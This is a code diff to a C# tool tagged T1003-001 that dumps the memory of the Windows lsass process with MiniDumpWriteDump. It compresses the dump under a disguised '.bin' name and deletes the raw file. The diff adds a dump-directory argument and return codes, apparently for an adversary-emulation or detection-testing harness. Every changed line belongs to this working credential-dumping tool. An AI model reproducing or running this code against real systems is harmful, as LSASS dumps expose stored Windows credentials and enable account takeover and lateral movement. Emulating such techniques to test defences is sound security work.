@@ -12,7 +12,7 @@ using System.Security.Principal;
 
 class Technique {
 	public static Dictionary<string, string> EntryData { get; set; }
-	public static Dictionary<string, string> ExitData { get; set; }
+	public static Dictionary<string, string> ExitData { get; set; } 
 
     [DllImport("dbghelp.dll", EntryPoint = "MiniDumpWriteDump", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
     static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, SafeHandle hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);
@@ -27,7 +27,7 @@ class Technique {
     public static void Compress(string inFile, string outFile) {
         try {
             if (File.Exists(outFile)) {
-                Console.WriteLine("[T1003-001] [X] Output file '{0}' already exists, removing", outFile);
+                Console.WriteLine("[T1003-001] Output file '{0}' already exists, removing", outFile);
                 File.Delete(outFile);
             }
 
@@ -39,32 +39,23 @@ class Technique {
             }
         }
         catch (Exception ex) {
-            Console.WriteLine("[T1003-001] [X] Exception while compressing file: {0}", ex.Message);
+            Console.WriteLine("[T1003-001] Exception while compressing file: {0}", ex.Message);
         }
     }
 
-    public static void Minidump(int pid = -1) {
+    public static void Minidump(string dumpDir) {
+
+        int pid = -1;
         IntPtr targetProcessHandle = IntPtr.Zero;
         uint targetProcessId = 0;
+        ExitData = new Dictionary<string, string>();
 
         Process targetProcess = null;
-        if (pid == -1) {
-            Process[] processes = Process.GetProcessesByName("lsass");
-            targetProcess = processes[0];
-        }
-        else {
-            try {
-                targetProcess = Process.GetProcessById(pid);
-            }
-            catch (Exception ex) {
-                // often errors if we can't get a handle to LSASS
-                Console.WriteLine(String.Format("\n[T1003-001] [X]Exception: {0}\n", ex.Message));
-                return;
-            }
-        }
+        Process[] processes = Process.GetProcessesByName("lsass");
+        targetProcess = processes[0];
 
         if (targetProcess.ProcessName == "lsass" && !IsHighIntegrity()) {
-            Console.WriteLine("\n[T1003-001] [X] Not in high integrity, unable to MiniDump!\n");
+            Console.WriteLine("[T1003-001] Not in high integrity, unable to MiniDump!\n");
             return;
         }
 
@@ -73,16 +64,15 @@ class Technique {
             targetProcessHandle = targetProcess.Handle;
         }
         catch (Exception ex) {
-            Console.WriteLine(String.Format("\n[T1003-001] [X] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
+            Console.WriteLine(String.Format("[T1003-001] Error getting handle to {0} ({1}): {2}\n", targetProcess.ProcessName, targetProcess.Id, ex.Message));
             return;
         }
         bool bRet = false;
 
-        string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-        string dumpFile = String.Format("{0}\\Temp\\debug{1}.out", systemRoot, targetProcessId);
-        string zipFile = String.Format("{0}\\Temp\\debug{1}.bin", systemRoot, targetProcessId);
+        string dumpFile = String.Format(@"{0}debug{1}.out", dumpDir, targetProcessId);
+        string zipFile = String.Format(@"{0}debug{1}.bin", dumpDir, targetProcessId);
 
-        Console.WriteLine(String.Format("\n[T1003-001] [*] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
+        Console.WriteLine(String.Format("[T1003-001] Dumping {0} ({1}) to {2}", targetProcess.ProcessName, targetProcess.Id, dumpFile));
 
         using (FileStream fs = new FileStream(dumpFile, FileMode.Create, FileAccess.ReadWrite, FileShare.Write)) {
             try {
@@ -93,16 +83,15 @@ class Technique {
             
         }
 
-        // if successful
         if (bRet) {
-            Console.WriteLine("[T1003-001] [+] Dump successful!");
-            Console.WriteLine(String.Format("\n[T1003-001] [*] Compressing {0} to {1} gzip file", dumpFile, zipFile));
+            Console.WriteLine("[T1003-001] Dump successful!");
+            Console.WriteLine(String.Format("[T1003-001] Compressing {0} to {1} gzip file", dumpFile, zipFile));
 
             Compress(dumpFile, zipFile);
 
-            Console.WriteLine(String.Format("[T1003-001] [*] Deleting {0}", dumpFile));
+            Console.WriteLine(String.Format("[T1003-001] Deleting {0}", dumpFile));
             File.Delete(dumpFile);
-            Console.WriteLine("\n[T1003-001] [+] Dumping completed. Rename file to \"debug{0}.gz\" to decompress.", targetProcessId);
+            Console.WriteLine("[T1003-001] Dumping completed.");
 
             string arch = System.Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE");
             string OS = "";
@@ -112,26 +101,39 @@ class Technique {
             }
 
             if (pid == -1) {
-                Console.WriteLine(String.Format("\n[T1003-001] [*] Operating System : {0}", OS));
-                Console.WriteLine(String.Format("[T1003-001] [*] Architecture     : {0}", arch));
+                Console.WriteLine(String.Format("[T1003-001] Operating System : {0}", OS));
+                Console.WriteLine(String.Format("[T1003-001] Architecture     : {0}", arch));
             }
+
+            ExitData["returncode"] = "0";
+            ExitData["returnmessage"] = "Dump was successful";
         }
         else {
-            Console.WriteLine(String.Format("[T1003-001] [X] Dump failed: {0}", bRet));
+            Console.WriteLine(String.Format("[T1003-001] Dump failed: {0}", bRet));
+            ExitData["returncode"] = "1";
+            ExitData["returnmessage"] = String.Format("Dump failed: {0}", bRet);
         }
     }
 
     public static void Main(string[] args) {
-        string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
-        string dumpDir = String.Format("{0}\\Temp\\", systemRoot);
-        Console.WriteLine("[T1003-001] Starting LSASS dump...");
+
+        string dumpDir = "";
+        if (args.Length >= 1 && Directory.Exists(args[0])) {
+            dumpDir = args[0];
+        } else {
+            string systemRoot = Environment.GetEnvironmentVariable("SystemRoot");
+            dumpDir = String.Format("{0}\\Temp\\", systemRoot);
+        }
+       
+        Console.WriteLine("[T1003-001] Starting LSASS dump to '{0}'...", dumpDir);
 
         if (!Directory.Exists(dumpDir)) {
-            Console.WriteLine(String.Format("\n[T1003-001] [X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
+            Console.WriteLine(String.Format("[T1003-001] [X] Dump directory \"{0}\" doesn't exist!\n", dumpDir));
             return;
         }
 
-        Minidump();
+        Minidump(dumpDir);
+
     }
 }
 
